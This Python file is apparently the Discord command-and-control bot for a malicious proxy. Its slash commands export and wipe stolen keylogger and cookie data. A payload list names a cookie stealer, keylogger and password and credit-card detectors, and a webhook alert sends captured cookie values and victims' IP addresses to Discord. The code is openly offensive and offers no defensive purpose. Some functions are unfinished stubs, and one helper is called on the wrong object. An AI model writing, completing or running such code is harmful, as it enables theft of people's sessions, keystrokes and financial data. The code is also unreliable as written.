import discord
from discord.ext import commands
import json
import os
import threading
from datetime import datetime
import requests

class ProxyBot(commands.Bot):
    def __init__(self, webhook_url):
        intents = discord.Intents.all()
        super().__init__(command_prefix='/', intents=intents)
        self.webhook_url = webhook_url
        self.proxy_running = True
        
    async def setup_hook(self):
        await self.tree.sync()

class DiscordBot:
    def __init__(self, webhook_url, token):
        self.webhook_url = webhook_url
        self.token = token
        self.bot = ProxyBot(webhook_url)
        self.setup_commands()
        
        # Start bot in a separate thread
        self.bot_thread = threading.Thread(target=self.start_bot)
        self.bot_thread.daemon = True  # This ensures the thread stops when the main program stops
        self.bot_thread.start()

    def start_bot(self):
        try:
            self.bot.run(self.token)
        except Exception as e:
            print(f"Discord bot error: {str(e)}")

    def send_webhook(self, data):
        try:
            requests.post(self.webhook_url, json=data)
        except Exception as e:
            print(f"Webhook error: {str(e)}")

    def setup_commands(self):
        @self.bot.tree.command(name="help", description="Display all available commands")
        async def help(interaction: discord.Interaction):
            commands = """
            🔍 **Available Commands**
            `/help` - Show this help message
            `/exportkl` - Export and clear keylogger data
            `/exportck` - Export and clear cookie data
            `/stop` - Stop the proxy server
            `/payloads` - View payload status
            `/clear` - Clear all data
            `/stats` - Show current statistics
            """
            await interaction.response.send_message(embed=self.bot.format_embed("Help", commands))

        @self.bot.tree.command(name="exportkl", description="Export and clear keylogger data")
        async def exportkl(interaction: discord.Interaction):
            try:
                with open('keylogs.json', 'r') as f:
                    data = json.load(f)
                
                if not data:
                    await interaction.response.send_message("No keylogger data available!")
                    return

                # Create a temporary file
                with open('temp_keylog.json', 'w') as f:
                    json.dump(data, f, indent=2)
                
                # Send file
                await interaction.response.send_message(
                    file=discord.File('temp_keylog.json'),
                    embed=self.bot.format_embed("Keylogger Export", f"📤 Exported {len(data)} entries")
                )
                
                # Clear the data
                with open('keylogs.json', 'w') as f:
                    json.dump([], f)
                
                # Cleanup
                os.remove('temp_keylog.json')
                
            except Exception as e:
                await interaction.response.send_message(f"Error: {str(e)}")

        @self.bot.tree.command(name="exportck", description="Export and clear cookie data")
        async def exportck(interaction: discord.Interaction):
            # Similar to exportkl but for cookies.json
            pass  # Implementation similar to exportkl

        @self.bot.tree.command(name="stop", description="Stop the proxy server")
        async def stop(interaction: discord.Interaction):
            await interaction.response.send_message(
                embed=self.bot.format_embed("Shutdown", "🛑 Stopping proxy server...")
            )
            self.bot.proxy_running = False
            # You'll need to implement the actual stopping mechanism

        @self.bot.tree.command(name="payloads", description="View payload status")
        async def payloads(interaction: discord.Interaction):
            payloads = {
                "Cookie Stealer": True,
                "Keylogger": True,
                "Password Detector": True,
                "Credit Card Detector": True,
                "Email Detector": True,
                "Geolocation": True
            }
            
            status = "\n".join([
                f"{'🟢' if status else '🔴'} {name}"
                for name, status in payloads.items()
            ])
            
            await interaction.response.send_message(
                embed=self.bot.format_embed("Payload Status", status)
            )

    def format_embed(self, title, description, color=0xc50f1f):
        return discord.Embed(
            title=title,
            description=description,
            color=color,
            timestamp=datetime.now()
        )

    def send_cookie_alert(self, cookie_data):
        embed = {
            "title": "🍪 New Cookie Captured",
            "color": 0xc50f1f,
            "fields": [
                {"name": "Name", "value": cookie_data['name'], "inline": True},
                {"name": "Value", "value": cookie_data['value'][:100] + "..." if len(cookie_data['value']) > 100 else cookie_data['value'], "inline": True},
                {"name": "URL", "value": cookie_data['url'], "inline": False},
                {"name": "IP", "value": cookie_data['ip'], "inline": True}
            ],
            "timestamp": datetime.now().isoformat()
        }
        self.send_webhook({"embeds": [embed]})

    # ... (other alert methods for keylogger, sensitive data, etc.)
